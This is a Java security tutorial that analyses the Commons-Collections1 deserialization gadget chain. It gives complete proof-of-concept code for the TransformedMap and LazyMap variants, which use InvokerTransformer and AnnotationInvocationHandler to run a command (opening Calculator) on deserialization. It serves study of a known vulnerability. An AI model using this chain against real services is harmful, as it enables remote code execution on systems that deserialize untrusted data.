# Java Security Learning-Commons-Collections1 Chain

Author: H3rmesk1t

# CommonsCollections Introduction
> [Apache Commons Collections](https://commons.apache.org/proper/commons-collections/index.html) is a third-party basic library that extends the `Collection` structure of the `Java` standard library. It provides many powerful data structure types and implements various collection tool classes. It is widely used in the development of various `Java` applications. The flawed version currently is `Apache Commons Collections 3.2.1` below (version 4.0 is also OK)

#Environmental construction
> 1. `JDK` version: JDK1.8u66 (requires JDK8u71 below)
> 2. `Commons-Collections` version: 3.1

> Use `maven` to build it. First create a `Maven` project without selecting any `Maven` template. The content in `pom.xml` is as follows. Then select the update on the right and let it automatically import the package.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

# Pre-knowledge
> In the Commons Collections library, an abstract class `org.apache.commons.collections.map.AbstractMapDecorator` is provided. This class is an extension of `Map` and is a basic decorator to provide additional functions for `Map`. This class has many implementation classes, and the triggering methods of each class are also different. In the `Commons-Collections1` chain, you need to focus on the `TransformedMap` class and `LazyMap` class.

## Transformer
> `org.apache.commons.collections.Transformer` is an interface that provides a `transform()` method to define specific conversion logic. The method receives `Object` input` of type `Object` and returns `Object` after processing. In `Commons-Collection`, the program provides multiple `Transformer` implementation classes to implement the function of modifying `key and value` in different `TransformedMap` classes.

<img src="./images/1.png">

## TransformedMap
> `org.apache.commons.collections.map.TransformedMap` class can automatically perform specific modification transformations on an element when it is added to the collection. In the `decorate()` method, the first parameter is the modified `Map` class, and the second parameter and the third parameter are used as a class that implements the `Transformer` interface to convert the key and value of the modified `Map` (it is not converted when it is `null`). Therefore, when the modified `map` adds a new element, the transform method of these two classes will be triggered.

<img src="./images/2.png">

## LazyMap
> `org.apache.commons.collections.map.LazyMap` is similar to `TransformedMap`, the difference is that when the `LazyMap` calls the `get()` method of the `key` does not exist, the `transform()` method of the `Transformer` of the corresponding parameter will be triggered.
> Add to add: the same function as `LazyMap` is also `org.apache.commons.collections.map.DefaultedMap`, which is also the `get()` method that triggers the `transform()` method

<img src="./images/3.png">

## ConstantTransformer
> `org.apache.commons.collections.functors.ConstantTransformer` is a `Transformer` that returns a fixed constant. A `Object` is stored during initialization. This `Object` will be returned directly during subsequent calls. This class is used to cooperate with `ChainedTransformer` and pass its result into `InvokerTransformer` to call the specified method of the class we specified.

<img src="./images/7.png" alt="">

## InvokerTransformer
> This is an implementation class, introduced in `Commons-Collections 3.0`, using reflection to create a new object

<img src="./images/4.png">

> demo code

```java
import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerDemo {
    public static void main(String[] args) {
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"});
        invokerTransformer.transform(Runtime.getRuntime());
    }
}
```
<img src="./images/5.png" alt="">

## ChainedTransformer
> `org.apache.commons.collections.functors.ChainedTransformer class is also an implementation class of `Transformer`, but this class maintains a `Transformer` array itself. When calling the `ChainedTransformer` class's `transform` method, it will loop the array, call the `transform` method of each `Transformer` array in turn, and pass the result to the next `Transformer`. Under such a processing mechanism, multiple `Transformers` can be called chained to process objects separately.

<img src="./images/6.png" alt="">

> demo code

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ChainedTransformerDemo {

    public static void main(String[] args) throws ClassNotFoundException{
        // Transformer array
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };

        // ChainedTransformer instance
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform("ChainedTransformerDemo");
    }
}
```

<img src="./images/8.png" alt="">

# Commons-Collections1-TransformedMap Analysis
> Use the `Decorate` method of `TransformedMap` to set `ChainedTransformer` to the processing method of the `map` decoder. When calling the `put()/setValue()` of `TransformedMap`, the calling method of the `TransformedMap` chain will be triggered.
> Looking for a class that rewrites `readObject`. When deserializing, you can change the value of `map` and locate the `sun.reflect.annotation.AnnotationInvocationHandler` class. This class implements the `InvocationHandler` interface (originally used for `JDK` dynamic proxy for annotation form)

> The constructor of the AnnotationInvocationHandler class has two parameters. The first parameter is the `Class` object of the `Annotation` implementation class, and the second parameter is a `Map` with `key`String` and `value``Object`. It should be noted that the constructor will judge `var1`. If and only if `var1` has only one parent interface and is `Annotation.class`, the two parameters will be initialized in the member attributes `type` and `memberValues`.

<img src="./images/10.png" alt="">

> Then look at the `readObject` method overridden by the `AnnotationInvocationHandler` class. First, call the `AnnotationType.getInstance(this.type)` method to obtain the `AnnotationType` object corresponding to the `type` annotation class, and then obtain its `memberTypes` property. This property is a `Map`, which can be stored in this annotation. With the configured value, then loop the `this.memberValues`Map to get its `Key`. If the `memberTypes` property of the annotation class has the same attribute as the `key` key of `this.memberValues` and the obtained value is not an instance of `ExceptionProxy` or an instance of `memberValues`, then obtain its value and call the `setValue` method to write the value.

<img src="./images/9.png" alt="">

> According to the above analysis process, there is basically no problem in constructing `Payload`

```
[1] Construct an AnnotationInvocationHandler instance, pass in an annotation class and a map. The key of this map must have attributes that exist in the annotation class and the value is not the corresponding instance and ExceptionProxy object.
[2] This map is encapsulated with TransformedMap and is decorated by calling the custom ChainedTransformer.
[3] ChainedTransformer writes multiple Transformer implementation classes to perform chain calls to achieve malicious operations
```

## POC
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsTransformedMap {

    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Transformer[] transformer = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        Map hashMap = new HashMap();
        hashMap.put("value", "d1no");
        Map transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class<?> h3rmesk1t = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = h3rmesk1t.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, transformedMap);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(invocationHandler);
            objectOutputStream.close();

            // Deserialization
            ByteArrayInputStream byteAr
rayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
<img src="./images/11.png" alt="">

# Commons-Collections1-LazyMap Analysis
> The core point is in `LazyMap#get`, `LazyMap` will try to call the `this.factory.transform` method when there is no `key`, and `this.factory` can be specified as a `Transformer` object, and the `transform` method parameter will be ignored, so you only need to find a method that calls `LazyMap.get`

<img src="./images/12.png" alt="">

> Here the `invoke()` method of the `AnnotationInvocationHandler` class can trigger `this.memberValues` to call the `get` method, thereby triggering `LazyMap#get`

<img src="./images/13.png" alt="">

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsLazyMap {

    public static void main(String[] ars) throws ClassNotFoundException ,InstantiationException, IllegalAccessException, InvocationTargetException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map LazyMap = org.apache.commons.collections.map.LazyMap.decorate(new HashMap(), chainedTransformer);
        Class<?> h3rmesk1t = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = h3rmesk1t.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, LazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(org.apache.commons.collections.map.LazyMap.class.getClassLoader(), org.apache.commons.collections.map.LazyMap.class.getInterfaces(), invocationHandler);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, mapProxy);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(handler);
            objectOutputStream.close();

            // Deserialization
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./images/14.png" alt="">

# Call chain

```java
AnnotationInvocationHandler.readObject()
   *Map(Proxy).entrySet()
        *AnnotationInvocationHandler.invoke()
            LazyMap.get()/TransformedMap.setValue()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                        InvokerTransformer.transform()
```

# Summarize
> Use the `AnnotationInvocationHandler` to trigger the `Map````````````````, etc. operation during deserialization, and cooperate with `Transformed
When executing the operation of the `Map` object, the `Transformer` conversion method will be called according to different situations. Finally, the chain call of `ChainedTransformer` and the reflection execution of `InvokerTransformer` complete the composition of the malicious call chain. The trigger of `LazyMap` also uses the dynamic proxy mechanism.